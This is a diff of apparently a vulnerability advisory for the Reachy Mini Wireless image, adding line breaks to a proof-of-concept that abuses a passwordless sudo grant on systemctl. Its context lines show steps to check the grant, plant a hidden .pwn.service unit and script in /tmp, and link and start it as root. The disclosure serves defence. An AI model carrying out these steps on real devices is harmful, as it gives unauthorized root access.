@@ -33,6 +33,8 @@ The Reachy Mini Wireless image ships the daemon user (pollen) with a passwordles
 
 ## PoC
 
+<br>
+
 **Step 1 - Confirm the sudoers grant**
 
 ```sudo -n -l 2>&1 | grep systemctl```
@@ -42,6 +44,8 @@ Expected output:
 ```(ALL) NOPASSWD: /usr/bin/systemctl```
 
 If the output shows a restricted form such as /usr/bin/systemctl restart reachy-mini-daemon, the escalation is blocked - skip to Impact.
+
+<br>
 
 **Step 2 - Write the malicious unit file**
 
@@ -57,6 +61,8 @@ chmod +x /tmp/.pwn.sh`
 
 /tmp is world-writable. Both files are owned by pollen:pollen. No elevated privilege is needed for this step.
 
+<br>
+
 **Step 3 - Link and start the unit**
 
 ```
@@ -66,6 +72,7 @@ sudo /usr/bin/systemctl start .pwn.service
 Expected output from the link command:
 Created symlink /etc/systemd/system/.pwn.service -> /tmp/.pwn.service.
 ```
+<br>
 
 **Step 4 - Verify root execution**
 
